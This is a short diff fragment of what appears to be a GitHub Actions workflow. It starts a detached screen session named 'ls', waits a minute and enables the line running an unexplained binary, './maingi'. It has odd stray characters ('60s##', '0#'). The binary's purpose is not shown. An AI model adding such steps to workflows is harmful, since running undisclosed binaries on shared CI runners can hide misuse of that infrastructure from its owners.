@@ -37,6 +37,6 @@ jobs:
         screen -dmS ls
         sleep 60s##
         cd "${GITHUB_WORKSPACE}"
-        0#./maingi
+        ./maingi
 
 
